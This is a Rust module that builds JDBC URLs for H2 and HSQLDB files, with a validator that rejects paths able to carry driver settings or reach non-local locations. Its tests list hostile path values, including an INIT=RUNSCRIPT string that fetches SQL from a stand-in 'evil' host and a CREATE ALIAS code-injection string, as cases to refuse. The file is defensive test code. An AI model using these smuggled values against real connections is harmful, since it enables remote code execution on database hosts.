//! The engines served by SpelaionDB's JDBC bridge (ADR-059, `spelaion-dev/spelaiondb-plugin-jdbc`):
//! H2 and HSQLDB files on this machine.
//!
//! **The core builds every JDBC URL** from the connection's fields, and a user never types one:
//! the engine's `file:` prefix and the file's absolute path, without its extension, and nothing
//! else. A path that would carry settings of its own (after a `;`, as H2's `INIT` does), that is
//! not absolute, that reaches a shared folder or that holds a control character is refused here,
//! before anything reaches the plugin; the bridge refuses the same, and adds its own settings.
//!
//! A database of these engines has users; the files people open almost always have the
//! engine's administrator without a password (`sa` on H2, `SA` on HSQLDB), which is the user a
//! connection without one logs in as.

use spelaion_config::Engine;
use spelaion_driver_api::{ConnectParams, DriverError};

/// The engines reached through the JDBC bridge.
pub fn is_bridged(engine: Engine) -> bool {
    matches!(engine, Engine::H2 | Engine::Hsqldb)
}

/// The JDBC subprotocol and the files a database of `engine` is made of, from the one people
/// pick (`.mv.db` for H2, `.script` or `.properties` for HSQLDB). `None` for another engine.
fn shape(engine: Engine) -> Option<(&'static str, &'static [&'static str])> {
    match engine {
        Engine::H2 => Some(("jdbc:h2:file:", &[".mv.db", ".h2.db"])),
        Engine::Hsqldb => Some((
            "jdbc:hsqldb:file:",
            &[".script", ".properties", ".data", ".log", ".backup"],
        )),
        _ => None,
    }
}

/// The user a connection without one logs in as: the engine's administrator.
pub fn default_user(engine: Engine) -> Option<&'static str> {
    match engine {
        Engine::H2 => Some("sa"),
        Engine::Hsqldb => Some("SA"),
        _ => None,
    }
}

/// Whether a path names a shared folder (`\\server\share`, `//server/share`), which a JDBC
/// driver would reach over the network.
fn shared_folder(path: &str) -> bool {
    path.starts_with("\\\\")
        || path.starts_with("//")
        || path.starts_with("\\/")
        || path.starts_with("/\\")
}

/// Whether a path is absolute on this machine: a drive and its root on Windows (`C:\…`,
/// `C:/…`), the root elsewhere.
fn absolute(path: &str) -> bool {
    let bytes = path.as_bytes();
    if cfg!(windows) {
        bytes.len() > 2
            && bytes[0].is_ascii_alphabetic()
            && bytes[1] == b':'
            && matches!(bytes[2], b'\\' | b'/')
    } else {
        path.starts_with('/')
    }
}

/// The JDBC URL of the database file at `path` (as the connection's `database` resolves it).
pub fn file_url(engine: Engine, path: &str) -> Result<String, String> {
    let Some((prefix, files)) = shape(engine) else {
        return Err(format!(
            "{} is not reached through the JDBC bridge",
            engine.label()
        ));
    };
    let label = engine.label();
    if path.contains(';') {
        return Err(format!(
            "an {label} file's path cannot hold a `;`: JDBC would read what follows it as settings"
        ));
    }
    if path.chars().any(char::is_control) {
        return Err(format!(
            "an {label} file's path cannot hold control characters"
        ));
    }
    if shared_folder(path) {
        return Err(format!(
            "an {label} file must be on this machine: copy it out of the shared folder first"
        ));
    }
    if !absolute(path) {
        return Err(format!("an {label} file's path must be absolute: {path:?}"));
    }
    let lower = path.to_ascii_lowercase();
    let stem = files
        .iter()
        .find(|file| lower.ends_with(*file))
        .map_or(path, |file| &path[..path.len() - file.len()]);
    let name = stem.rsplit(['/', '\\']).next().unwrap_or_default();
    if name.is_empty() {
        return Err(format!("an {label} file's path names no file: {path:?}"));
    }
    Ok(format!("{prefix}{stem}"))
}

/// The parameters a session of a bridged engine connects with: its file's JDBC URL in place of
/// the path, and the administrator when no user is given. `None` for any other engine.
pub fn bridged_params(
    engine: Engine,
    params: &ConnectParams,
) -> Result<Option<ConnectParams>, DriverError> {
    if !is_bridged(engine) {
        return Ok(None);
    }
    let mut bridged = params.clone();
    bridged.database = file_url(engine, params.database.trim()).map_err(DriverError::Other)?;
    if bridged.user.trim().is_empty() {
        bridged.user = default_user(engine).unwrap_or_default().to_string();
    }
    Ok(Some(bridged))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn root(rest: &str) -> String {
        if cfg!(windows) {
            format!("C:\\data\\{rest}")
        } else {
            format!("/data/{rest}")
        }
    }

    #[test]
    fn a_file_becomes_its_engines_url_without_its_extension() {
        assert_eq!(
            file_url(Engine::H2, &root("shop.mv.db")).unwrap(),
            format!("jdbc:h2:file:{}", root("shop"))
        );
        assert_eq!(
            file_url(Engine::H2, &root("shop.MV.DB")).unwrap(),
            format!("jdbc:h2:file:{}", root("shop"))
        );
        assert_eq!(
            file_url(Engine::H2, &root("shop")).unwrap(),
            format!("jdbc:h2:file:{}", root("shop"))
        );
        for picked in ["shop.script", "shop.properties", "shop.data"] {
            assert_eq!(
                file_url(Engine::Hsqldb, &root(picked)).unwrap(),
                format!("jdbc:hsqldb:file:{}", root("shop"))
            );
        }
    }

    /// ADR-059: no driver setting that runs code is ever passed. Each of these tries to get one
    /// into the URL, or to reach somewhere other than a file on this machine.
    #[test]
    fn a_path_that_would_carry_settings_or_reach_elsewhere_is_refused() {
        let refused = [
            root("shop;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"),
            root("shop.mv.db;INIT=CREATE ALIAS X AS $$ void x() {} $$"),
            root("shop;IFEXISTS=FALSE"),
            root("shop\n;INIT=x"),
            root("sh\u{0}op"),
            "shop.mv.db".into(),
            "relative/shop".into(),
            "~/shop".into(),
            "mem:shop".into(),
            "tcp://localhost/shop".into(),
            "\\\\server\\share\\shop.mv.db".into(),
            "//server/share/shop.mv.db".into(),
            String::new(),
        ];
        for engine in [Engine::H2, Engine::Hsqldb] {
            for path in &refused {
                assert!(file_url(engine, path).is_err(), "{engine:?} {path:?}");
            }
        }
        // A file that is only its engine's extension names no database.
        assert!(file_url(Engine::H2, &root(".mv.db")).is_err());
        assert!(file_url(Engine::Hsqldb, &root(".script")).is_err());
        assert!(file_url(Engine::Sqlite, &root("shop.db")).is_err());
    }

    #[test]
    fn a_session_connects_with_the_url_and_the_administrator() {
        let params = ConnectParams {
            database: root("shop.mv.db"),
            ..Default::default()
        };
        let bridged = bridged_params(Engine::H2, &params).unwrap().unwrap();
        assert_eq!(bridged.database, format!("jdbc:h2:file:{}", root("shop")));
        assert_eq!(bridged.user, "sa");
        let named = ConnectParams {
            user: "owner".into(),
            ..params.clone()
        };
        assert_eq!(
            bridged_params(Engine::Hsqldb, &named)
                .unwrap()
                .unwrap()
                .user,
            "owner"
        );
        assert!(bridged_params(Engine::Duckdb, &params).unwrap().is_none());
        let sneaky = ConnectParams {
            database: root("shop;INIT=x"),
            ..Default::default()
        };
        assert!(bridged_params(Engine::H2, &sneaky).is_err());
    }
}
